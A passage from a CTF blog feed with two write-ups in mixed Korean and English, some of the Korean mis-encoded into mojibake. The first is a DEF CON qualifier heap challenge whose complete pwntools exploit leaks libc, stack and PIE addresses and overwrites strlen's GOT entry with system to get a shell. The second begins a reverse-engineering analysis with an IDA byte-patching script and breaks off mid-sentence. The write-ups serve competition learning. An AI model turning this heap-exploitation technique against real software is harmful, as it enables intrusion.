tcache exists, tcache bin is full and then chunks are stored in unsorted bin.</li><li>8 are freed, and from the 9th are stored in the unsorted bin.</li><li>At this time, the libc address is written in the chunk. I leaked this.</li><li>Referred to this blog(Korean): <a href="https://velog.io/@woounnan/SYSTEM-Heap-Basics-Bin">https://velog.io/@woounnan/SYSTEM-Heap-Basics-Bin</a></li></ul><ol start="2"><li>Getting the stack address stored in libc.symbols[‚Äòenviron‚Äô]</li></ol><ul><li>The stack address was leaked to get the pie base address.</li></ul><ol start="3"><li>Getting the pie base address</li></ol><ul><li>There is a pie address in the stack with a high probability.</li></ul><ol start="4"><li>Overwriting e.got[‚Äòstrlen‚Äô] with the system function</li></ol><ul><li>Since strlen(input) is used in the create() function, strlen is overwritten by the system function and ‚Äò&#x2F;bin&#x2F;sh‚Äô is sent as an input.</li></ul><p><br><br></p><p>Ï§ëÍ∞Ñ Ï§ëÍ∞Ñ leakÌïòÎ©¥ÏÑú ÌîÑÎ°úÍ∑∏Îû®Ïù¥ ÏûêÍæ∏ Ï¢ÖÎ£åÎêòÏóàÎã§. Í∑∏ÎûòÏÑú ÏïÑÎûò payloadÎ•º Ïù¥Ïö©ÌïòÏó¨ next Ìè¨Ïù∏ÌÑ∞Î•º Ï†ïÏÉÅÏ†ÅÏúºÎ°ú ÎßåÎì§Ïñ¥Ï£ºÍ≥† Îã§Ïùå leakÏùÑ ÏßÑÌñâÌïòÏòÄÎã§.</p><p>The program exit after leak. So, by using the payload below, I made next pointer normally and proceeded with the next leak.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x200</span>-<span class="number">1</span>) + <span class="string">b&#x27;B&#x27;</span></span><br><span class="line">payload += p32(heap_base + <span class="number">0xbf0</span>) <span class="comment"># next</span></span><br><span class="line">payload += p32(<span class="number">0x42424242</span>) <span class="comment"># prev</span></span><br><span class="line">modify(<span class="number">5</span>, payload)</span><br></pre></td></tr></table></figure><h2 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment"># context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./open-housep&#x27;</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./open-housep&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"><span class="comment"># libc = ELF(&#x27;/usr/lib32/libc.so.6&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create</span>(<span class="params">content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;c&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;review!&#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;d&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;?&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">modify</span>(<span class="params">index, content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;m&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;?&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;?&#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">view</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;v&#x27;</span>)</span><br><span class="line"></span><br><span class="line">create(<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x200</span>-<span class="number">1</span>)+<span class="string">b&#x27;b&#x27;</span>)</span><br><span class="line">create(<span class="string">b&#x27;cccc&#x27;</span>)</span><br><span class="line">view()</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;aaab&#x27;</span>)</span><br><span class="line">heap_base = u32(p.recv(<span class="number">4</span>)) - <span class="number">0x2860</span></span><br><span class="line">info(<span class="built_in">hex</span>(heap_base))</span><br><span class="line"></span><br><span class="line"><span class="comment"># delete(1) # Ìïú Î≤àÎßå ÌïòÎ©¥ tcacheÎ°ú Îì§Ïñ¥Í∞ê; „Ö†„Ö†</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    delete(<span class="number">1</span>) </span><br><span class="line"></span><br><span class="line">create(<span class="string">b&#x27;A&#x27;</span>*<span class="number">0x20</span>)</span><br><span class="line">create(<span class="string">b&#x27;s&#x27;</span>*<span class="number">0x20</span>) <span class="comment"># for next chunk</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x200</span>-<span class="number">1</span>) + <span class="string">b&#x27;B&#x27;</span></span><br><span class="line">payload += p32(heap_base + <span class="number">0x1010</span>) <span class="comment"># next</span></span><br><span class="line">payload += p32(<span class="number">0x42424242</span>) <span class="comment"># prev</span></span><br><span class="line">modify(<span class="number">5</span>, payload)</span><br><span class="line"></span><br><span class="line">view()</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;BBBB\n\n**** - &#x27;</span>)</span><br><span class="line">libc_leak = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">info(<span class="string">&#x27;libc base :: &#x27;</span> + <span class="built_in">hex</span>(libc_leak))</span><br><span class="line"></span><br><span class="line">libc.address = libc_leak - <span class="number">0x2257f8</span></span><br><span class="line">info(<span class="string">&#x27;libc base :: &#x27;</span> + <span class="built_in">hex</span>(libc.address))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">### ÏõêÎûòÎåÄÎ°ú Î∞îÍøî Ï§Ä Îã§Ïùå(create ÏïàÎêòÏñ¥ÏÑú), environ Ï∂úÎ†•Ìï¥ÏÑú Ïä§ÌÉù Ï£ºÏÜå Î¶≠</span></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x200</span>-<span class="number">1</span>) + <span class="string">b&#x27;B&#x27;</span></span><br><span class="line">payload += p32(heap_base + <span class="number">0xbf0</span>) <span class="comment"># next</span></span><br><span class="line">payload += p32(<span class="number">0x42424242</span>) <span class="comment"># prev</span></span><br><span class="line">modify(<span class="number">5</span>, payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x200</span>-<span class="number">1</span>) + <span class="string">b&#x27;B&#x27;</span></span><br><span class="line">payload += p32(libc.symbols[<span class="string">&#x27;environ&#x27;</span>] ) <span class="comment"># next</span></span><br><span class="line">payload += p32(<span class="number">0x42424242</span>) <span class="comment"># prev</span></span><br><span class="line">modify(<span class="number">5</span>, payload)</span><br><span class="line"></span><br><span class="line">view()</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;BBBB\n\n**** - &#x27;</span>)</span><br><span class="line">stack_leak = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">info(<span class="string">&#x27;stack leak :: &#x27;</span> + <span class="built_in">hex</span>(stack_leak))</span><br><span class="line"></span><br><span class="line"><span class="comment">### ÏõêÎûòÎåÄÎ°ú Î∞îÍøî Ï§Ä Îã§Ïùå(create ÏïàÎêòÏñ¥ÏÑú), Ïä§ÌÉùÏóê Ï†ÄÏû•Îêú ÌååÏù¥ Ï£ºÏÜå Î¶≠</span></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x200</span>-<span class="number">1</span>) + <span class="string">b&#x27;B&#x27;</span></span><br><span class="line">payload += p32(heap_base + <span class="number">0xbf0</span>) <span class="comment"># next</span></span><br><span class="line">payload += p32(<span class="number">0x42424242</span>) <span class="comment"># prev</span></span><br><span class="line">modify(<span class="number">5</span>, payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x200</span>-<span class="number">1</span>) + <span class="string">b&#x27;B&#x27;</span></span><br><span class="line">payload += p32(stack_leak + <span class="number">0xc0</span>) <span class="comment"># next</span></span><br><span class="line">payload += p32(<span class="number">0x42424242</span>) <span class="comment"># prev</span></span><br><span class="line">modify(<span class="number">5</span>, payload)</span><br><span class="line"></span><br><span class="line">view()</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;BBBB\n\n**** - &#x27;</span>)</span><br><span class="line">pie_leak = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">info(<span class="string">&#x27;pie leak :: &#x27;</span> + <span class="built_in">hex</span>(pie_leak))</span><br><span class="line"></span><br><span class="line">e.address = pie_leak - <span class="number">0x34</span></span><br><span class="line">info(<span class="string">&#x27;pie base :: &#x27;</span> + <span class="built_in">hex</span>(e.address))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">### ÏõêÎûòÎåÄÎ°ú Î∞îÍøî Ï§Ä Îã§Ïùå</span></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x200</span>-<span class="number">1</span>) + <span class="string">b&#x27;B&#x27;</span></span><br><span class="line">payload += p32(heap_base + <span class="number">0xbf0</span>) <span class="comment"># next</span></span><br><span class="line">payload += p32(<span class="number">0x42424242</span>) <span class="comment"># prev</span></span><br><span class="line">modify(<span class="number">5</span>, payload)</span><br><span class="line"></span><br><span class="line">create(<span class="string">b&#x27;eeeeeeee&#x27;</span>)</span><br><span class="line">create(<span class="string">b&#x27;ffffffff&#x27;</span>)</span><br><span class="line">create(<span class="string">b&#x27;gggggggg&#x27;</span>)</span><br><span class="line">create(<span class="string">b&#x27;hhhhhhhh&#x27;</span>)</span><br><span class="line">create(<span class="string">b&#x27;iiiiiiii&#x27;</span>) <span class="comment"># 11</span></span><br><span class="line">create(<span class="string">b&#x27;jjjjjjjj&#x27;</span>) <span class="comment"># 12</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;O&#x27;</span> * (<span class="number">0x200</span>-<span class="number">1</span>) + <span class="string">b&#x27;O&#x27;</span></span><br><span class="line">payload += p32(e.got[<span class="string">&#x27;strlen&#x27;</span>]) <span class="comment"># next</span></span><br><span class="line">payload += p32(<span class="number">0x42424242</span>) <span class="comment"># prev</span></span><br><span class="line">modify(<span class="number">11</span>, payload)</span><br><span class="line">modify(<span class="number">12</span>, p64(libc.symbols[<span class="string">&#x27;system&#x27;</span>]))</span><br><span class="line"></span><br><span class="line">create(<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> Defcon </category>
          
      </categories>
      
      
        <tags>
            
            <tag> heap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DEF CON CTF Qualifier 2023 - Test Your Luck (LiveCTF)</title>
      <link href="/230601-defcon2023-test-your-luck/"/>
      <url>/230601-defcon2023-test-your-luck/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://ctftime.org/event/1871">https://ctftime.org/event/1871</a></li></ul><blockquote><p>Can you beat the hottest new skill-based game sweeping the nation? Is guessing 32 bits really possible within the span of the CTF?</p></blockquote><ul><li>[30 solves]</li></ul><p>very fun challenge XD</p><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><p>IDAÎ°ú Î¥§ÏùÑ ÎïåÎ≥¥Îã§ Îçî ÎßéÏùÄ Î°úÏßÅÏù¥ ÏûàÎäî Í≤É Í∞ôÏïòÎã§. Í∑∏ÎûòÏÑú ÎÇòÎäî Ï£ºÎ°ú GDBÎ•º Ïù¥Ïö©ÌïòÏó¨ Î∂ÑÏÑùÌñàÎã§. IDAÏóêÏÑú ÏïîÌò∏ÌôîÎêú Ìï®ÏàòÎ•º Ï∞æÏùÑ Ïàò ÏûàÏóàÎã§.</p><p>It seems to have a bit more logic than the function seen with IDA. So I usually analyzed with GDB. I could find encrypted function in IDA.</p><img src="/images/230601-defcon2023-test-your-luck/1.png" width=550/><br><p>ÏúÑ Ìï®ÏàòÍ∞Ä ÎèôÏ†Å ÎîîÎ≤ÑÍπÖÌï† ÎïåÎäî Ïûò Ìï¥ÏÑùÏù¥ ÎêòÏñ¥ÏÑú Î∞îÏù¥Ìä∏Î•º Ï∂îÏ∂úÌï¥ÏÑú Ìå®ÏπòÎ•º Ìï¥Ï£ºÍ∏∞Î°ú ÌïòÏòÄÎã§.</p><p>The above function was interpreted well during dynamic debugging, so I decided to extract the bytes and patch them.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">gef&gt; x/20i 0x555555556000</span><br><span class="line">   0x555555556000:      endbr64</span><br><span class="line">   0x555555556004:      push   r12</span><br><span class="line">   0x555555556006:      xor    r9d,r9d</span><br><span class="line">   0x555555556009:      xor    r8d,r8d</span><br><span class="line">   0x55555555600c:      mov    ecx,0x8</span><br><span class="line">   0x555555556011:      push   rbp</span><br><span class="line">   0x555555556012:      mov    esi,0x1</span><br><span class="line">   0x555555556017:      mov    edi,0x1</span><br><span class="line">   0x55555555601c:      push   rbx</span><br><span class="line">   0x55555555601d:      sub    rsp,0x20</span><br><span class="line">   0x555555556021:      mov    rax,QWORD PTR fs:0x28</span><br><span class="line">   0x55555555602a:      mov    QWORD PTR [rsp+0x18],rax</span><br><span class="line">   0x55555555602f:      lea    rax,[rip+0xffffffffffffdfca]        # 0x555555554000</span><br><span class="line">   0x555555556036:      lea    rdx,[rsp+0x8]</span><br><span class="line">   0x55555555603b:      lea    rbp,[rsp+0x10]</span><br><span class="line">   0x555555556040:      mov    QWORD PTR [rsp+0x8],rax</span><br><span class="line">   0x555555556045:      call   0x5555555552e9 &lt;syscall&gt;</span><br><span class="line">   0x55555555604a:      lea    r12,[rip+0x22ef]        # 0x555555558340</span><br><span class="line">   0x555555556051:      jmp    0x5555555560a9</span><br><span class="line">   0x555555556053:      nop    DWORD PTR [rax+rax*1+0x0]</span><br><span class="line">...</span><br><span class="line">   0x555555556145:      sub    rax,QWORD PTR fs:0x28</span><br><span class="line">   0x55555555614e:      jne    0x555555556159</span><br><span class="line">   0x555555556150:      add    rsp,0x20</span><br><span class="line">   0x555555556154:      pop    rbx</span><br><span class="line">   0x555555556155:      pop    rbp</span><br><span class="line">   0x555555556156:      pop    r12</span><br><span class="line">   0x555555556158:      ret</span><br><span class="line">   0x555555556159:      call   0x555555555030 &lt;__stack_chk_fail@plt&gt;</span><br><span class="line">   0x55555555615e:      add    BYTE PTR [rax],al</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gef&gt; p/x 0x55555555615e - 0x555555556000</span><br><span class="line">$3 = 0x15e</span><br><span class="line">gef&gt; print-format --length 0x15e --bitlen 8 --lang py 0x555555556000</span><br><span class="line">buf = [0xf3, 0xf, ... ]</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">buf = [<span class="number">0xf3</span>, <span class="number">0xf</span>, <span class="number">0x1e</span>, <span class="number">0xfa</span>, <span class="number">0x41</span>, <span class="number">0x54</span>, <span class="number">0x45</span>, <span class="number">0x31</span>, <span class="number">0xc9</span>, <span class="number">0x45</span>, <span class="number">0x31</span>, <span class="number">0xc0</span>, <span class="number">0xb9</span>, <span class="number">0x8</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x55</span>, <span class="number">0xbe</span>, <span class="number">0x1</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xbf</span>, <span class="number">0x1</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x53</span>, <span class="number">0x48</span>, <span class="number">0x83</span>, <span class="number">0xec</span>, <span class="number">0x20</span>, <span class="number">0x64</span>, <span class="number">0x48</span>, <span class="number">0x8b</span>, <span class="number">0x4</span>, <span class="number">0x25</span>, <span class="number">0x28</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0x44</span>, <span class="number">0x24</span>, <span class="number">0x18</span>, <span class="number">0x48</span>, <span class="number">0x8d</span>, <span class="number">0x5</span>, <span class="number">0xca</span>, <span class="number">0xdf</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0x48</span>, <span class="number">0x8d</span>, <span class="number">0x54</span>, <span class="number">0x24</span>, <span class="number">0x8</span>, <span class="number">0x48</span>, <span class="number">0x8d</span>, <span class="number">0x6c</span>, <span class="number">0x24</span>, <span class="number">0x10</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0x44</span>, <span class="number">0x24</span>, <span class="number">0x8</span>, <span class="number">0xe8</span>, <span class="number">0x9f</span>, <span class="number">0xf2</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0x4c</span>, <span class="number">0x8d</span>, <span class="number">0x25</span>, <span class="number">0xef</span>, <span class="number">0x22</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xeb</span>, <span class="number">0x56</span>, <span class="number">0xf</span>, <span class="number">0x1f</span>, <span class="number">0x44</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x48</span>, <span class="number">0x8b</span>, <span class="number">0x5c</span>, <span class="number">0x24</span>, <span class="number">0x10</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0x5c</span>, <span class="number">0x24</span>, <span class="number">0x8</span>, <span class="number">0x4c</span>, <span class="number">0x39</span>, <span class="number">0xe3</span>, <span class="number">0x72</span>, <span class="number">0xd</span>, <span class="number">0x48</span>, <span class="number">0x3b</span>, <span class="number">0x1d</span>, <span class="number">0x12</span>, <span class="number">0x25</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf</span>, <span class="number">0x86</span>, <span class="number">0x9c</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x48</span>, <span class="number">0x85</span>, <span class="number">0xdb</span>, <span class="number">0xf</span>, <span class="number">0x84</span>, <span class="number">0xc3</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x45</span>, <span class="number">0x31</span>, <span class="number">0xc9</span>, <span class="number">0x45</span>, <span class="number">0x31</span>, <span class="number">0xc0</span>, <span class="number">0x31</span>, <span class="number">0xf6</span>, <span class="number">0x31</span>, <span class="number">0xff</span>, <span class="number">0xb9</span>, <span class="number">0x8</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0xea</span>, <span class="number">0x48</span>, <span class="number">0xc7</span>, <span class="number">0x44</span>, <span class="number">0x24</span>, <span class="number">0x10</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xe8</span>, <span class="number">0x4c</span>, <span class="number">0xf2</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0x85</span>, <span class="number">0xc0</span>, <span class="number">0x7e</span>, <span class="number">0x4f</span>, <span class="number">0x48</span>, <span class="number">0x8b</span>, <span class="number">0x44</span>, <span class="number">0x24</span>, <span class="number">0x10</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0x3</span>, <span class="number">0x45</span>, <span class="number">0x31</span>, <span class="number">0xc9</span>, <span class="number">0x45</span>, <span class="number">0x31</span>, <span class="number">0xc0</span>, <span class="number">0x31</span>, <span class="number">0xf6</span>, <span class="number">0x31</span>, <span class="number">0xff</span>, <span class="number">0xb9</span>, <span class="number">0x8</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0xea</span>, <span class="number">0x48</span>, <span class="number">0xc7</span>, <span class="number">0x44</span>, <span class="number">0x24</span>, <span class="number">0x10</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xe8</span>, <span class="number">0x20</span>, <span class="number">0xf2</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0x85</span>, <span class="number">0xc0</span>, <span class="number">0x7f</span>, <span class="number">0x8b</span>, <span class="number">0x45</span>, <span class="number">0x31</span>, <span class="number">0xc9</span>, <span class="number">0x45</span>, <span class="number">0x31</span>, <span class="number">0xc0</span>, <span class="number">0x31</span>, <span class="number">0xc9</span>, <span class="number">0x31</span>, <span class="number">0xd2</span>, <span class="number">0xbe</span>, <span class="number">0x1</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xbf</span>, <span class="number">0x3c</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xe8</span>, <span class="number">0x3</span>, <span class="number">0xf2</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xe9</span>, <span class="number">0x6d</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xf</span>, <span class="number">0x1f</span>, <span class="number">0x44</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x45</span>, <span class="number">0x31</span>, <span class="number">0xc9</span>, <span class="number">0x45</span>, <span class="number">0x31</span>, <span class="number">0xc0</span>, <span class="number">0x31</span>, <span class="number">0xc9</span>, <span class="number">0x31</span>, <span class="number">0xd2</span>, <span class="number">0xbe</span>, <span class="number">0x1</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xbf</span>, <span class="number">0x3c</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xe8</span>, <span class="number">0xe0</span>, <span class="number">0xf1</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xeb</span>, <span class="number">0x96</span>, <span class="number">0xf</span>, <span class="number">0x1f</span>, <span class="number">0x44</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x45</span>, <span class="number">0x31</span>, <span class="number">0xc9</span>, <span class="number">0x45</span>, <span class="number">0x31</span>, <span class="number">0xc0</span>, <span class="number">0x31</span>, <span class="number">0xc9</span>, <span class="number">0x31</span>, <span class="number">0xd2</span>, <span class="number">0xbe</span>, <span class="number">0x4</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xbf</span>, <span class="number">0x3c</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xe8</span>, <span class="number">0xc0</span>, <span class="number">0xf1</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0x48</span>, <span class="number">0x8b</span>, <span class="number">0x5c</span>, <span class="number">0x24</span>, <span class="number">0x8</span>, <span class="number">0x48</span>, <span class="number">0x85</span>, <span class="number">0xdb</span>, <span class="number">0xf</span>, <span class="number">0x85</span>, <span class="number">0x46</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0x66</span>, <span class="number">0xf</span>, <span class="number">0x1f</span>, <span class="number">0x84</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x48</span>, <span class="number">0x8b</span>, <span class="number">0x44</span>, <span class="number">0x24</span>, <span class="number">0x18</span>, <span class="number">0x64</span>, <span class="number">0x48</span>, <span class="number">0x2b</span>, <span class="number">0x4</span>, <span class="number">0x25</span>, <span class="number">0x28</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x75</span>, <span class="number">0x9</span>, <span class="number">0x48</span>, <span class="number">0x83</span>, <span class="number">0xc4</span>, <span class="number">0x20</span>, <span class="number">0x5b</span>, <span class="number">0x5d</span>, <span class="number">0x41</span>, <span class="number">0x5c</span>, <span class="number">0xc3</span>, <span class="number">0xe8</span>, <span class="number">0xd2</span>, <span class="number">0xee</span>, <span class="number">0xff</span>, <span class="number">0xff</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(buf)):</span><br><span class="line">    addr = <span class="number">0x2000</span> + i</span><br><span class="line">    byte = buf[i]</span><br><span class="line"></span><br><span class="line">    cmd = <span class="string">&#x27;patch_byte(&#x27;</span>+<span class="built_in">str</span>(<span class="built_in">hex</span>(addr))+<span class="string">&#x27;,&#x27;</span>+<span class="built_in">str</span>(<span class="built_in">hex</span>(byte))+<span class="string">&#x27;);&#x27;</span></span><br><span class="line">    <span class="built_in">print</span>(cmd) </span><br></pre></td></tr></table></figure><p>ÏúÑ ÌååÏù¥Ïç¨ Ïä§ÌÅ¨Î¶ΩÌä∏Î•º Ïã§ÌñâÌï¥ÏÑú ÎÇòÏò® Í≤∞Í≥ºÎ•º IDAÏóêÏÑú Ïä§ÌÅ¨Î¶ΩÌä∏Î°ú Ïã§ÌñâÌïòÎ©¥ ÎêúÎã§. Ïù¥Îïå Ï§ëÏöîÌïú Ï†êÏùÄ IDAÏóê Î∞òÏòÅÌïòÍ≥† ‚Äòreanalyze program‚Äô Ìïú ÌõÑ ÍªêÎã§ 